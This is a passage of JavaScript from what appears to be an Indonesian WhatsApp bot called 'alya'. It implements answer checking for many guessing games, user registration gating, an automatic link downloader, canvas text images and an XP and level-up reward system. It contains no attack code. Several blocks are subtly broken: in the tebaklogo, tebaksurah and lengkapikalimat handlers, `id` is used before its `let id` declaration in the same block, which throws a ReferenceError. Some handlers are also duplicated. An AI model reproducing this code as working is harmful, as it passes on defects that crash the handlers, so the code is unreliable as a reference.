      replyalya(`💢 Menyerah ya~\nJawaban: *${json.jawaban}*\n🎤 Artist: *${json.artist || '?'}*`)
    }
  }
}

    alya.tebaklogo = alya.tebaklogo ? alya.tebaklogo : {}
    if (id in alya.tebaklogo && !m.key.fromMe) {
        let json = alya.tebaklogo[id][1]
    let id = m.chat;
    let users = global.db.users[m.sender];
        
        if (budy.toLowerCase() === json.jawaban.toLowerCase().trim()) {
            users.exp += 500 
            reply(`✅ *Benar!*\n+500 XP`)
            clearTimeout(alya.tebaklogo[id][2]) 
            delete alya.tebaklogo[id] 
        } 
        
        else if (/nyerah|surrender/i.test(m.text)) {
            reply(`💢 Menyerah! Jawabannya: ${json.jawaban}`)
            clearTimeout(alya.tebaklogo[id][2]) 
            delete alya.tebaklogo[id] 
        } 
        
        else {
            reply('❌ Jawaban salah!')
        }
        return
    }

alya.tebaksurah = alya.tebaksurah ? alya.tebaksurah : {}
            if (id in alya.tebaksurah && !m.key.fromMe) {
    let id = m.chat
    let users = global.db.users[m.sender]
                let json = alya.tebaksurah[id][1]
                
                
                if (budy.toLowerCase() === json.surah.englishName.toLowerCase().trim()) {
                    users.exp += 4999 
                    reply(`✅ *Benar!*\n+4999 XP`, alya.tebaksurah[id][0])
                    clearTimeout(alya.tebaksurah[id][2])
                    delete alya.tebaksurah[id]
                } else if (/nyerah|surrender/i.test(m.text)) { 
                    reply(`💢 Menyerah!\nSurah: *${json.surah.englishName}*`, alya.tebaksurah[id][0])
                    clearTimeout(alya.tebaksurah[id][2])
                    delete alya.tebaksurah[id]
                } else {
                    reply('❌ Jawaban salah!')
                }
                return
            }

    alya.lengkapikalimat = alya.lengkapikalimat ? alya.lengkapikalimat : {}
    if (id in alya.lengkapikalimat && !m.key.fromMe) {
    let id = m.chat
    let users = global.db.users[m.sender]
        let json = alya.lengkapikalimat[id][1]
        if (budy.toLowerCase() === json.jawaban.toLowerCase().trim()) {
            users.exp += 5000 
            reply(`✅ *Benar!*\n+5000 XP`)
            clearTimeout(alya.lengkapikalimat[id][2])
            delete alya.lengkapikalimat[id]
        } else if (/nyerah|surrender/i.test(m.text)) { 
            reply(`💢 Menyerah! Jawabannya: ${json.jawaban}`)
            clearTimeout(alya.lengkapikalimat[id][2])
            delete alya.lengkapikalimat[id]
        } else {
            reply('❌ Jawaban salah!')
        }
        return
    }


{
    alya.game = alya.game ? alya.game : {}
    const _tgId = 'tebakgame-' + m.chat
    if (_tgId in alya.game && !m.key.fromMe) {
        let json = alya.game[_tgId][1]
        let users = global.db.users[m.sender]
        if (m.text && m.text.toLowerCase() === json.jawaban.toLowerCase().trim()) {
            if (users) users.exp = (users.exp || 0) + 4999
            replyalya(`✅ *Benar!*\n\n🎮 Judul: *${json.jawaban}*\n⭐ +4999 XP`)
            clearTimeout(alya.game[_tgId][3])
            delete alya.game[_tgId]
        } else if (m.text && /^(nyerah|surrender)$/i.test(m.text.trim())) {
            replyalya(`💢 Menyerah! Jawabannya: *${json.jawaban}*`)
            clearTimeout(alya.game[_tgId][3])
            delete alya.game[_tgId]
        }
    }
}


{
    alya.game = alya.game ? alya.game : {}
    const _tmlId = 'tebakanml-' + m.chat
    if (_tmlId in alya.game && !m.key.fromMe) {
        let json = alya.game[_tmlId][1]
        let users = global.db.users[m.sender]
        if (m.text && m.text.toLowerCase() === json.jawaban.toLowerCase().trim()) {
            if (users) users.exp = (users.exp || 0) + 4999
            replyalya(`✅ *Benar!*\n\n🎮 Jawaban: *${json.jawaban}*\n⭐ +4999 XP`)
            clearTimeout(alya.game[_tmlId][3])
            delete alya.game[_tmlId]
        } else if (m.text && /^(nyerah|surrender)$/i.test(m.text.trim())) {
            replyalya(`💢 Menyerah! Jawabannya: *${json.jawaban}*`)
            clearTimeout(alya.game[_tmlId][3])
            delete alya.game[_tmlId]
        }
    }
}

alya.tebakkata = alya.tebakkata ? alya.tebakkata : {}  
if (from in alya.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(alya.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
 replyalya(`${teks}`)
 clearTimeout(alya.tebakkata[id][2])
 delete alya.tebakkata[id]
} else if (/^(nyerah|surrender)$/i.test(budy.trim())) {
 replyalya(`💢 Menyerah! Jawabannya: *${json.jawaban}*`)
 clearTimeout(alya.tebakkata[id][2])
 delete alya.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
alya.tebakgambar = alya.tebakgambar ? alya.tebakgambar : {} 
if(from in alya.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(alya.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
 replyalya(`${teks}`)
 clearTimeout(alya.tebakgambar[id][3])
 delete alya.tebakgambar[id]
} else if (/^(nyerah|surrender)$/i.test(budy.trim())) {
 replyalya(`💢 Menyerah! Jawabannya: *${json.jawaban}*`)
 clearTimeout(alya.tebakgambar[id][3])
 delete alya.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}

alya.tebakbendera2 = alya.tebakbendera2 ? alya.tebakbendera2 : {};
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyalya('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await alya.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
alya.tebakbendera = alya.tebakbendera ? alya.tebakbendera : {};
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyalya('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await alya.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
alya.tebakkabupaten = alya.tebakkabupaten ? alya.tebakkabupaten : {};
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyalya('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await alya.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
 alya.tebakkimia = alya.tebakkimia ? alya.tebakkimia : {};
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyalya('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await alya.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
        

alya.tekateki = alya.tekateki ? alya.tekateki : {}  
if(from in alya.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(alya.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += alya.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${alya.tekateki[id][2]} Money 💸`
 replyalya(`${teks}`)
 clearTimeout(alya.tekateki[id][3])
 delete alya.tekateki[id]
 } else if (/^(nyerah|surrender)$/i.test(budy.trim())) {
 replyalya(`💢 Menyerah! Jawabannya: *${json.jawaban}*`)
 clearTimeout(alya.tekateki[id][3])
 delete alya.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyalya(`*Dikit Lagi!*`)
}

alya.tebakasahotak = alya.tebakasahotak ? alya.tebakasahotak : {};
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyalya('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await alya.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }

        alya.siapaaku = alya.siapaaku ? alya.siapaaku : {}
if(from in alya.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(alya.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += alya.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${alya.siapaaku[id][2]} Money 💸`
   replyalya(`${teks}`)
 clearTimeout(alya.siapaaku[id][3])
 delete alya.siapaaku[id]
 } else if (/^(nyerah|surrender)$/i.test(budy.trim())) {
 replyalya(`💢 Menyerah! Jawabannya: *${json.jawaban}*`)
 clearTimeout(alya.siapaaku[id][3])
 delete alya.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyalya(`*Dikit Lagi!*`)

}

        alya.susunkata = alya.susunkata ? alya.susunkata : {}  
if(from in alya.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(alya.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += alya.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${alya.susunkata[id][2]} Money 💸`
replyalya(`${teks}`)
 clearTimeout(alya.susunkata[id][3])
 delete alya.susunkata[id]
 } else if (/^(nyerah|surrender)$/i.test(budy.trim())) {
 replyalya(`💢 Menyerah! Jawabannya: *${json.jawaban}*`)
 clearTimeout(alya.susunkata[id][3])
 delete alya.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyalya(`*Dikit Lagi!*`)

 
}

alya.caklontong = alya.caklontong ? alya.caklontong : {};
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 alya.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == "nyerah") {
replyalya(`💢 Menyerah! Jawabannya: *${jawaban}*`)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
alya.tebakkalimat = alya.tebakkalimat ? alya.tebakkalimat : {};
if (alya.tebakkalimat && alya.tebakkalimat[m.chat]) {
  let [json, timer] = alya.tebakkalimat[m.chat]

  if (
    m.text &&
    m.text.toLowerCase().trim() === json.jawaban.toLowerCase()
  ) {
    clearTimeout(timer)
    delete alya.tebakkalimat[m.chat]

    db.users[m.sender].money += 10000

    replyalya(
      `🎉 *BENAR!*\n\nJawaban: ${json.jawaban}\n💰 Hadiah: 10.000 money`
    )
  }
}


if (!global.stickerSession) global.stickerSession = {};
global.stickerSession = global.stickerSession || {}
global.packLibrary = global.packLibrary || {}
global.editImageProcess = global.editImageProcess || {}
global.toFigureProcess = global.toFigureProcess || {}
alya.openBalapan = alya.openBalapan || null
alya.balapanPvP = alya.balapanPvP || {}
alya.tebaklirik = alya.tebaklirik || {}

if (m.chat in alya.tebaklirik) {
  const similarity = require('similarity')
  const threshold = 0.72

  if (!m.text) return

  let id = m.chat
  let users = global.db.users[m.sender]
  let json = alya.tebaklirik[id][1]

  let jawaban = json.jawaban.toLowerCase().trim()
  let teksUser = m.text.toLowerCase().trim()

  if (teksUser === jawaban) {
    users.money += alya.tebaklirik[id][2]
    users.exp += 10

    replyalya(
      `🎉 *GAME TEBAK LIRIK*\n\n` +
      `✅ Jawaban kamu *BENAR!*\n\n` +
      `💸 +${alya.tebaklirik[id][2]} Money\n` +
      `✨ +10 EXP`
    )

    clearTimeout(alya.tebaklirik[id][3])
    delete alya.tebaklirik[id]

  } else if (similarity(teksUser, jawaban) >= threshold) {
    replyalya('🔥 *Dikit lagi!*')
  }
}



alya.tebakfilm = alya.tebakfilm || {}
if (m.chat in alya.tebakfilm && !m.key.fromMe) {
  const session = alya.tebakfilm[m.chat]
  if (m.text) {
    const jawaban = session[1]?.jawaban || ''
    const teks    = m.text.toLowerCase().trim()
    if (teks === jawaban.toLowerCase().trim()) {
      clearTimeout(session[2])
      delete alya.tebakfilm[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 12000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(`🎉 *BENAR!*\n\n🎬 Judul: *${jawaban}*\n💰 +12,000 Money\n🎫 +2 Limit`)
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(session[2])
      delete alya.tebakfilm[m.chat]
      replyalya(`💢 Menyerah ya~\nJawabannya: *${jawaban}*`)
    }
  }
}


alya.tebakhewan = alya.tebakhewan || {}
if (m.chat in alya.tebakhewan && !m.key.fromMe) {
  const session = alya.tebakhewan[m.chat]
  if (m.text) {
    const jawaban = session[1]?.jawaban || ''
    const teks    = m.text.toLowerCase().trim()
    if (teks === jawaban.toLowerCase().trim()) {
      clearTimeout(session[2])
      delete alya.tebakhewan[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 12000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(`🎉 *BENAR!*\n\n🐾 Hewan: *${jawaban}*\n💰 +12,000 Money\n🎫 +2 Limit`)
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(session[2])
      delete alya.tebakhewan[m.chat]
      replyalya(`💢 Menyerah ya~\nJawabannya: *${jawaban}*`)
    }
  }
}


alya.tebakdrakor = alya.tebakdrakor || {}
if (m.chat in alya.tebakdrakor && !m.key.fromMe) {
  const session = alya.tebakdrakor[m.chat]
  if (m.text) {
    const jawaban = session[1]?.jawaban || ''
    const teks    = m.text.toLowerCase().trim()
    if (teks === jawaban.toLowerCase().trim()) {
      clearTimeout(session[2])
      delete alya.tebakdrakor[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 15000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(`🎉 *BENAR!*\n\n🇰🇷 Drama: *${jawaban}*\n💰 +15,000 Money\n🎫 +2 Limit`)
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(session[2])
      delete alya.tebakdrakor[m.chat]
      replyalya(`💢 Menyerah ya~\nJawabannya: *${jawaban}*`)
    }
  }
}


alya.tebakjkt48 = alya.tebakjkt48 || {}
if (m.chat in alya.tebakjkt48 && !m.key.fromMe) {
  const session = alya.tebakjkt48[m.chat]
  if (m.text) {
    const jawaban = session[1]?.jawaban || ''
    const teks    = m.text.toLowerCase().trim()
    if (teks === jawaban.toLowerCase().trim()) {
      clearTimeout(session[2])
      delete alya.tebakjkt48[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 12000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(`🎉 *BENAR!*\n\n🎀 Member: *${jawaban}*\n💰 +12,000 Money\n🎫 +2 Limit`)
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(session[2])
      delete alya.tebakjkt48[m.chat]
      replyalya(`💢 Menyerah ya~\nJawabannya: *${jawaban}*`)
    }
  }
}


alya.tebakmakanan = alya.tebakmakanan || {}
if (m.chat in alya.tebakmakanan && !m.key.fromMe) {
  const session = alya.tebakmakanan[m.chat]
  if (m.text) {
    const jawaban = session[1]?.jawaban || ''
    const teks    = m.text.toLowerCase().trim()
    if (teks === jawaban.toLowerCase().trim()) {
      clearTimeout(session[2])
      delete alya.tebakmakanan[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 10000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(`🎉 *BENAR!*\n\n🍜 Makanan: *${jawaban}*\n💰 +10,000 Money\n🎫 +2 Limit`)
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(session[2])
      delete alya.tebakmakanan[m.chat]
      replyalya(`💢 Menyerah ya~\nJawabannya: *${jawaban}*`)
    }
  }
}


alya.tebaknegara = alya.tebaknegara || {}
if (m.chat in alya.tebaknegara && !m.key.fromMe) {
  const session = alya.tebaknegara[m.chat]
  if (m.text) {
    const jawaban = session[1]?.jawaban || ''
    const teks    = m.text.toLowerCase().trim()
    if (teks === jawaban.toLowerCase().trim()) {
      clearTimeout(session[2])
      delete alya.tebaknegara[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 10000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(`🎉 *BENAR!*\n\n🌍 Negara: *${jawaban}*\n💰 +10,000 Money\n🎫 +2 Limit`)
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(session[2])
      delete alya.tebaknegara[m.chat]
      replyalya(`💢 Menyerah ya~\nJawabannya: *${jawaban}*`)
    }
  }
}


alya.tebakprofesi = alya.tebakprofesi || {}
if (m.chat in alya.tebakprofesi && !m.key.fromMe) {
  const session = alya.tebakprofesi[m.chat]
  if (m.text) {
    const jawaban = session[1]?.jawaban || ''
    const teks    = m.text.toLowerCase().trim()
    if (teks === jawaban.toLowerCase().trim()) {
      clearTimeout(session[2])
      delete alya.tebakprofesi[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 10000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(`🎉 *BENAR!*\n\n👔 Profesi: *${jawaban}*\n💰 +10,000 Money\n🎫 +2 Limit`)
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(session[2])
      delete alya.tebakprofesi[m.chat]
      replyalya(`💢 Menyerah ya~\nJawabannya: *${jawaban}*`)
    }
  }
}


alya.tebakepep = alya.tebakepep || {}
if (m.chat in alya.tebakepep && !m.key.fromMe) {
  const session = alya.tebakepep[m.chat]
  if (m.text) {
    const jawaban = session[1]?.jawaban || ''
    const teks    = m.text.toLowerCase().trim()
    if (teks === jawaban.toLowerCase().trim()) {
      clearTimeout(session[2])
      delete alya.tebakepep[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 15000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(`🎉 *BENAR!*\n\n🎮 Karakter: *${jawaban}*\n💰 +15,000 Money\n🎫 +2 Limit`)
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(session[2])
      delete alya.tebakepep[m.chat]
      replyalya(`💢 Menyerah ya~\nJawabannya: *${jawaban}*`)
    }
  }
}


if (m.chat in (alya.tebaklirik || {}) && !m.key.fromMe && m.text) {
  if (/^(nyerah|surrender)$/i.test(m.text.toLowerCase().trim())) {
    const sesi = alya.tebaklirik[m.chat]
    if (sesi) {
      const jawaban = sesi[1]?.jawaban || '???'
      clearTimeout(sesi[3])
      delete alya.tebaklirik[m.chat]
      replyalya(`💢 Menyerah ya~\nJawaban: *${jawaban}*`)
    }
  }
}




alya.tebaktebakan = alya.tebaktebakan ? alya.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 alya.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"


let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]


const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
alya.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
replyalya("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}


if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: alya.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, alya.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
alya.ev.emit('messages.upsert', msg)
}
if (!global.statusBot) {
    global.statusBot = [];
}











const _regMatchedPrefix = matchPrefix(budy)
if (!m.key.fromMe && _regMatchedPrefix !== null) {
    const command = budy.slice(_regMatchedPrefix.length).trim().split(/ +/).shift().toLowerCase()
    const args = budy.slice(_regMatchedPrefix.length + command.length).trim().split(/ +/)

    const { findRegisteredUser: _findRegUser } = require('./lib/userRegistration')
    const user = _findRegUser(global.db, m.sender)
    const isRegistered = !!user
    const isVerified = user?.verified

    if (!isRegistered && command !== 'daftar' && command !== 'automaticreg') {
        return alya.sendMessage(m.chat, {
            image: fs.readFileSync('./media/belum_daftar.jpg'),
            caption: `⚠️ *Kamu belum terdaftar!*\nSilakan ketik *.daftar* untuk mulai menggunakan bot.`,
            contextInfo: {}
        }, { quoted: m })
    }
}




if (!isCmd && !m.key.fromMe && budy && budy.trim()) {
    try {
        const aioLib = require('./lib/aioDownloader.js');
        if (aioLib.isAutoDlEnabled(m.chat)) {
            const detectedUrl = aioLib.extractUrl(budy);
            if (detectedUrl) {
                const dedupKey = `${m.chat}|${detectedUrl}`;
                if (aioLib.checkDedupGuard(dedupKey)) {
                    (async () => {
                        try {
                            await alya.sendMessage(m.chat, { react: { text: '💫', key: m.key } });
                            const data = await aioLib.fetchAio(detectedUrl);
                            await aioLib.sendAioResult(alya, m, data);
                            await alya.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
                        } catch (e) {
                            console.error('[aio-autodetect]', e.message);
                            await alya.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
                        }
                    })();
                }
            }
        }
    } catch (e) {
        console.error('[aio-autodetect] hook error:', e.message);
    }
}



if (global.tebakanml[m.sender]) {
    let jawaban = global.tebakanml[m.sender].jawaban
    let poin = global.tebakanml[m.sender].poin

    if (budy.toLowerCase() === jawaban) {
        reply(`🎉 Jawaban Benar!\n+${poin} XP\nJawaban: *${jawaban}*`)
        if (!global.db.users[m.sender]) global.db.users[m.sender] = { exp: 0 }
        global.db.users[m.sender].exp += poin
        delete global.tebakanml[m.sender]
    } else if (budy.toLowerCase() === 'nyerah') {
        reply(`❌ Menyerah ya?\nJawabannya adalah: *${jawaban}*`)
        delete global.tebakanml[m.sender]
    }
}
let createCanvas, loadImage, registerFont;
try {
    ({ createCanvas, loadImage, registerFont } = require('canvas'));
    registerFont('./data/assets/Indie-Flower.ttf', { family: 'Indie' });
} catch {   }

async function generateTextImage(templatePath, outputPath, text, options = {}) {
    const image = await loadImage(templatePath);
    const canvas = createCanvas(image.width, image.height);
    const ctx = canvas.getContext('2d');

    ctx.drawImage(image, 0, 0, image.width, image.height);

    ctx.font = `${options.fontSize || 23}px Indie`;
    ctx.fillStyle = options.color || '#000000';
    ctx.textBaseline = 'top';

    const x = options.x || 50;
    const y = options.y || 50;
    const lineHeight = options.lineHeight || 30;
    const maxLines = options.maxLines || 38;

    const words = text.split(' ');
    let line = '';
    let lines = [];
    for (let i = 0; i < words.length; i++) {
        const testLine = line + words[i] + ' ';
        const metrics = ctx.measureText(testLine);
        if (metrics.width > (options.maxWidth || 800)) {
            lines.push(line);
            line = words[i] + ' ';
        } else {
            line = testLine;
        }
    }
    lines.push(line);
    lines = lines.slice(0, maxLines);

    lines.forEach((l, idx) => {
        ctx.fillText(l, x, y + idx * lineHeight);
    });

    const buffer = canvas.toBuffer('image/jpeg');
    fs.writeFileSync(outputPath, buffer);
    return buffer;
}
const cooldownPath = './database/xpcooldown.json'

if (!global._cooldownCache || (Date.now() - global._cooldownCache.ts) > 30000) {
    try {
        global._cooldownCache = {
            data: fs.existsSync(cooldownPath) ? JSON.parse(fs.readFileSync(cooldownPath)) : {},
            ts: Date.now()
        };
    } catch { global._cooldownCache = { data: {}, ts: Date.now() }; }
}
const cooldown = global._cooldownCache.data;



async function uploadCatbox(buffer) {
  const form = new FormData()
  form.append("reqtype", "fileupload")
  form.append("fileToUpload", buffer, "levelup.jpg")

  const res = await axios.post("https://catbox.moe/user/api.php", form, {
    headers: form.getHeaders()
  })

  return res.data
}
const levelRoles = [
  { level: 0, role: "Pemula" },
  { level: 10, role: "Senior" },
  { level: 20, role: "Pro" },
  { level: 40, role: "Expert" },
  { level: 80, role: "Master" },
  { level: 120, role: "Legend" }
]

function getRole(level) {
  let role = "Pemula"
  for (let i of levelRoles) {
    if (level >= i.level) role = i.role
  }
  return role
}
function xpRequired(level) {
  return 100000 * (level + 1)
}

async function addXP(m) {

  if (!global.db.users[m.sender]) return
  let user = global.db.users[m.sender]

  user.exp = user.exp || 0
  user.level = user.level || 0
  user.money = user.money || 0
  user.limit = user.limit || 0
  user.role = user.role || "Pemula"

  let xp = Math.floor(Math.random() * 15) + 5
  user.exp += xp

  let oldLevel = user.level
  let levelUp = false

  while (true) {
    let need = xpRequired(user.level)
    if (user.exp < need) break

    user.exp -= need
    user.level += 1
    user.role = getRole(user.level)
    levelUp = true
  }

  if (!levelUp) return

  let rewardMoney = user.level * 500
  let rewardLimit = Math.floor(user.level / 5) + 1

  user.money += rewardMoney
  user.limit += rewardLimit

  
  const _lvupCaption = [
    `🎉 *LEVEL UP — XP SYSTEM!*`,
    ``,
    `@${m.sender.split('@')[0]} berhasil naik level!`,
    ``,
    `⬆️ Level : ${oldLevel} ➜ *${user.level}*`,
    `🏅 Role  : *${user.role}*`,
    ``,
    `🎁 *Reward Diterima:*`,
    `💰 Money : +${rewardMoney.toLocaleString('id-ID')}`,
    `🎫 Limit : +${rewardLimit}`,
  ].join('\n')

  let _lvCardSent = false
  try {
    const { generateLevelCard, getLevelData } = require('./plugins/cmd/levelup_chatcount')
    const chatCount = Number(global.db.users?.[m.sender]?.chatCount || 0)
    const levelData = getLevelData(chatCount)
    let avatarUrl = null
    try { avatarUrl = await alya.profilePictureUrl(m.sender, 'image') } catch {}
    const buf = await generateLevelCard({
      username:  m.pushName || user.name || 'User',
      chatCount,
      levelData,
      avatarUrl,
      isLevelUp: true,
      oldLevel,
    })
    await alya.sendMessage(m.chat, {
      image:    buf,
      caption:  _lvupCaption,
      mentions: [m.sender],
    })
    _lvCardSent = true
  } catch (cardErr) {
    console.log('[LEVELUP CARD] Canvas error:', cardErr.message)
  }

  
  if (!_lvCardSent) {
    try {
      await alya.sendMessage(m.chat, {
        text:     _lvupCaption,
        mentions: [m.sender],
      })
    } catch (txtErr) {
      console.error('[LEVELUP TEXT] Gagal kirim notif:', txtErr.message)
    }
  }
  
}

if (!global.xpCooldown) global.xpCooldown = {}

async function processXP(m) {

  const cooldown = 5000
  const now = Date.now()

  if (!global.xpCooldown[m.sender]) {
    global.xpCooldown[m.sender] = 0
  }

  if (now - global.xpCooldown[m.sender] > cooldown) {
    global.xpCooldown[m.sender] = now
    await addXP(m)
  }
}
registerFont('./data/assets/FontsFree-Net-SFProDisplay-Bold.ttf', { family: 'SF Bold' })

